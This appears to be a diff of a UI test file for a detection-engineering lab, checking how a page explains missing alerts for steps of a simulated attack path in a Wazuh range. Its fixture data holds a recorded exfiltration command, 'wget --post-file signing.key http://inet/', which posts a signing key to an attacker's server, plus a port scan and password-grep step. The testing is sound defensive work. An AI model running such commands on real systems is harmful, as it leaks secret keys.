@@ -194,6 +194,7 @@ describe("the page for fixing a step", () => {
     expect(within(recorded).getByText(/The shell the lab starts each test from/)).toBeVisible();
     expect(within(recorded).getByText("This recording does not say which settings it loaded.")).toBeVisible();
     // The other runs of its technique.
+    expect(within(recorded).getByRole("heading", { level: 3, name: /^Other tests of the same technique in this run/ })).toBeVisible();
     const rm = within(recorded).getByRole("link", { name: /Clear Bash history \(rm\)/ });
     expect(rm).toHaveTextContent("test 4");
     expect(rm).toHaveTextContent("alerted");
@@ -303,6 +304,91 @@ describe("the page for fixing a step", () => {
     expect(start).toHaveTextContent("A published rule raised an alert on it. There is nothing to fix here.");
     expect(within(screen.getByRole("region", { name: "Rules that matched it" })).getByRole("article", { name: "History File Deletion" })).toHaveTextContent("alert · high");
     expect(screen.queryByRole("textbox")).toBeNull();
+  });
+
+  it("for a step of a range, says that its sensors and rules are set in the range's spec and images, not in the lab's folders", async () => {
+    const RULES = "Wazuh 4.14.10 stock rules with the lab's decoder for snoopy, on manager";
+    const base = fixture({
+      steps: [
+        step("1", 1, 2, { title: "Port Scan", host: "build", from: "web", outcome: "seen", visibility: { answer: "telemetry only", basis: "1 archived event tied to the step", events: 1 } }),
+        step("2", 3, 4, { title: "Extract passwords with grep", host: "web", outcome: "unseen", visibility: { answer: "no telemetry", basis: "no archived event tied to the step", events: 0 } }),
+        step("3", 5, 6, { title: "Exfiltration Over Alternative Protocol - HTTP", host: "inet", from: "web", outcome: "seen", visibility: { answer: "telemetry only", basis: "1 archived event tied to the step", events: 1 } }),
+      ],
+      events: [
+        { ...event("1-1", "1", 1.5), host: "build", sensor: "wazuh-agent-build", kind: "sshd line", text: "banner exchange: invalid format", tied_by: "address" },
+        { ...event("1-2", "1", 1.6), host: "web", sensor: "wazuh-agent-web", kind: "process start", text: "nmap -sT build", tied_by: "session" },
+        { ...event("3-1", "3", 5.5), host: "web", sensor: "wazuh-agent-web", kind: "process start", text: "wget --post-file signing.key http://inet/", tied_by: "session" },
+      ],
+      alerts: [alert("r1", "1", 1.5, ["1-1"], { host: "build", counts: false, rule: { id: "5710", title: "sshd: Attempt to login using a non-existent user", level: "low", origin: "pinned" } })],
+      when: "live",
+    });
+    const range: Recording = {
+      ...base,
+      id: "range-1",
+      kind: "attack path",
+      network: {
+        hosts: [
+          { id: "web", name: "web", role: "web application", kind: "host" },
+          { id: "build", name: "build", role: "build server", kind: "host" },
+          { id: "inet", name: "inet", role: "attacker's server", kind: "host" },
+          { id: "manager", name: "manager", role: "Wazuh manager", kind: "defense" },
+        ],
+        sensors: [
+          { id: "wazuh-agent-web", name: "Wazuh agent 4.14.10", host: "web", records: "the lines of /var/log/auth.log" },
+          { id: "wazuh-agent-build", name: "Wazuh agent 4.14.10", host: "build", records: "the lines of /var/log/auth.log" },
+        ],
+        detectors: [{ id: "pinned", name: RULES, rules: 8454, when: "live" }],
+      },
+    };
+
+    const seen = mount("1", { recording: range, pairs: [] });
+    const start = await screen.findByRole("region", { name: "Where to start" });
+    // A step of an attack path is named and counted as a step, as the live view names it.
+    expect(start).toHaveTextContent("A sensor recorded this step, but no rule raised an alert. Start with a rule that matches what the sensor recorded.");
+    expect(screen.getByText("step 1", { exact: true })).toBeVisible();
+    expect(await within(screen.getByRole("region", { name: /^What was already tried/ })).findByText("No comparison has moved this step yet.")).toBeVisible();
+    expect(start).toHaveTextContent(`The rules that ran in this range were ${RULES}. The range has no rules of the lab's own yet.`);
+    expect(start).toHaveTextContent("A new rule goes into the manager's image, which lab/bluefire_lab/range/build.py writes.");
+    expect(start).not.toHaveTextContent("lab/rules/linux/");
+    // Both agents that recorded the step, each named by its host since they share a name: the scanned host's and the one it ran from.
+    const recorded = screen.getByRole("region", { name: /^What was recorded/ });
+    expect(within(recorded).getByRole("article", { name: "Sensor Wazuh agent on build" })).toHaveTextContent("1 event of this step");
+    expect(within(recorded).getByRole("article", { name: "Sensor Wazuh agent on web" })).toHaveTextContent("nmap -sT build");
+    const draft = screen.getByRole("textbox", { name: "Your rule" });
+    expect(draft).toHaveAccessibleDescription(/The range has no folder for rules of the lab's own yet, so this draft has no file to go in/);
+    expect(draft).toHaveAccessibleDescription(/lab\/bluefire_lab\/range\/build\.py/);
+    expect(draft).not.toHaveAccessibleDescription(/lab\/rules\/linux\//);
+    const again = screen.getByRole("region", { name: "Running it again" });
+    expect(again).toHaveTextContent("What a sensor reads is set in the range's spec under lab/range/. A rule goes into the image of the host manager, which lab/bluefire_lab/range/build.py writes.");
+    expect(again).toHaveTextContent("Its CI builds the range, runs the path through it again and keeps the new recording in the run's artifact.");
+    expect(again).not.toHaveTextContent("lab/sensors/");
+    expect(again).not.toHaveTextContent("lab/rules/linux/");
+    seen.view.unmount();
+
+    const unseen = mount("2", { recording: range, pairs: [] });
+    const sensorStart = await screen.findByRole("region", { name: "Where to start" });
+    expect(sensorStart).toHaveTextContent("Nothing of this step was recorded. Start with a sensor's settings");
+    expect(screen.getByRole("heading", { level: 3, name: /^Other steps of the same technique in this run/ })).toBeVisible();
+    expect(sensorStart).toHaveTextContent("In this range each sensor is a Wazuh agent built into its host's image. The range's spec under lab/range/ sets what it reads: the logs and folders under defense.watch, and each host's own watch.");
+    expect(sensorStart).not.toHaveTextContent("lab/sensors/");
+    unseen.view.unmount();
+
+    // Whatever the recording calls its rule set, with the host in its name or not, the sentences read as one
+    // passage, and the one after the rule set's name speaks of the manager's image without naming the host again.
+    for (const name of [RULES, "Wazuh 4.14.10 stock rules"]) {
+      const named: Recording = { ...range, network: { ...range.network, detectors: [{ id: "pinned", name, rules: 8454, when: "live" }] } };
+      const shown = mount("1", { recording: named, pairs: [] });
+      const where = await screen.findByRole("region", { name: "Where to start" });
+      const passage = within(where).getByText((_, element) => element?.tagName === "P" && (element.textContent ?? "").startsWith("The rules that ran in this range"));
+      expect(passage.textContent).toBe(`The rules that ran in this range were ${name}. The range has no rules of the lab's own yet. A new rule goes into the manager's image, which lab/bluefire_lab/range/build.py writes.`);
+      expect(passage).not.toHaveTextContent(/the host manager|image of manager/);
+      shown.view.unmount();
+    }
+
+    // A step whose host has no agent, recorded by the agent of the host it ran from.
+    mount("3", { recording: range, pairs: [] });
+    const goal = await screen.findByRole("region", { name: /^What was recorded/ });
+    expect(within(goal).getByRole("article", { name: "Sensor Wazuh agent on web" })).toHaveTextContent("wget --post-file signing.key http://inet/");
   });
 
   it("says in the model's place one of two fixed texts by the configured provider's kind, read from the configuration", async () => {
